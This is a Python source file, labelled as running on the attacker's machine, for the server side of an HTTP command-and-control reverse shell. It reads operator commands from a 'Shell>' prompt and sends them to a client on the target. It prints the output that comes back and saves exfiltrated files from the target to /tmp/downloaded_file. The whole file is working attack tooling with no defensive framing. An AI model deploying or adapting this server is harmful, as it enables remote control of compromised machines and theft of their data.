#Server ----> runs on the attacker's machine

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import os,cgi

HTTP_STATUS_OK = 200

# IP and port the HTTP server listens on (will be queried by client.py)
ATTACKER_IP = '0.0.0.0'
ATTACKER_PORT = 8080

class MyHandler(BaseHTTPRequestHandler):

    # Don't print: 127.0.0.1 - - [22/Jun/2021 21:29:43] "POST / HTTP/1.1" 200
    def log_message(self, format, *args):
        pass

    def save_file(self, length):
        data = parse_qs(self.rfile.read(length).decode())
        with open('/tmp/downloaded_file','wb') as output_file:
            output_file.write(data["rfile"][0].encode())
        print("File saved as /tmp/downloaded_file")

    # Send command to client (on Target)
    def do_GET(self):
        command = input("Shell> ")
        self.send_response(HTTP_STATUS_OK)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        self.send_response(200)
        self.end_headers()

        if self.path == '/store':
            try:
                self.save_file(length)
            except Exception as e:
                print(e)
            finally:
                return

        data = parse_qs(self.rfile.read(length).decode())
        if "rfile" in data:
            print(data["rfile"][0])


if __name__ == '__main__':
    myServer = HTTPServer((ATTACKER_IP, ATTACKER_PORT), MyHandler)

    try:
        print(f'[*] Server started on {ATTACKER_IP}:{ATTACKER_PORT}')
        myServer.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        myServer.server_close()
